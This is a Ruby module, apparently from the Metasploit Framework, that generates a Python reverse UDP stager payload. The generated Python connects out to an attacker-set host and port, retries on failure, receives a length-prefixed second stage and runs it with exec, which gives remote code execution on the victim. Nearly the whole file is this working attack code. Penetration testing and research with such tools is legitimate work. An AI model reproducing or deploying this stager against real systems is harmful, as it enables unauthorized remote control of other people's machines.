# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/python/send_uuid'

module Msf

###
#
# Complex reverse_udp payload generation for Python
#
###

  module Payload::Python::ReverseUdp

    include Msf::Payload::Python
    include Msf::Payload::Python::SendUUID

    def initialize(*args)
      super
      register_advanced_options(Msf::Opt::stager_retry_options)
    end

    #
    # Generate the first stage
    #
    def generate
      conf = {
          port:        datastore['LPORT'],
          host:        datastore['LHOST'],
          retry_count: datastore['StagerRetryCount'],
          retry_wait:  datastore['StagerRetryWait']
      }

      generate_reverse_udp(conf)
    end

    #
    # By default, we don't want to send the UUID, but we'll send
    # for certain payloads if requested.
    #
    def include_send_uuid
      false
    end

    def transport_config(opts={})
      transport_config_reverse_udp(opts)
    end

    def generate_reverse_udp(opts={})
      # Set up the socket
      cmd  = "import socket,struct#{opts[:retry_wait].to_i > 0 ? ',time' : ''}\n"
      if opts[:retry_wait].blank? # do not retry at all (old style)
        cmd << "s=socket.socket(2,socket.SOCK_DGRAM)\n" # socket.AF_INET = 2
        cmd << "s.connect(('#{opts[:host]}',#{opts[:port]}))\n"
      else
        if opts[:retry_count] > 0
          cmd << "for x in range(#{opts[:retry_count].to_i}):\n"
        else
          cmd << "while 1:\n"
        end
        cmd << "\ttry:\n"
        cmd << "\t\ts=socket.socket(2,socket.SOCK_DGRAM)\n" # socket.AF_INET = 2
        cmd << "\t\ts.connect(('#{opts[:host]}',#{opts[:port]}))\n"
        cmd << "\t\tbreak\n"
        cmd << "\texcept:\n"
        if opts[:retry_wait].to_i <= 0
          cmd << "\t\tpass\n" # retry immediately
        else
          cmd << "\t\ttime.sleep(#{opts[:retry_wait]})\n" # retry after waiting
        end
      end
      if include_send_uuid
        cmd << py_send_uuid
      else
        # when not sending a uuid, send a single newline which must be a python bytes object (str on 2.x, bytes on 3.x)
        cmd << "import binascii\n"
        cmd << "s.send(binascii.a2b_hex('0a'))\n"
      end
      cmd << "l=struct.unpack('>I',s.recv(4))[0]\n"
      cmd << "d=s.recv(l)\n"
      cmd << "while len(d)<l:\n"
      cmd << "\td+=s.recv(l-len(d))\n"
      cmd << "exec(d,{'s':s})\n"

      py_create_exec_stub(cmd)
    end

    def handle_intermediate_stage(conn, payload)
      conn.put([payload.length].pack("N"))
    end

  end

end


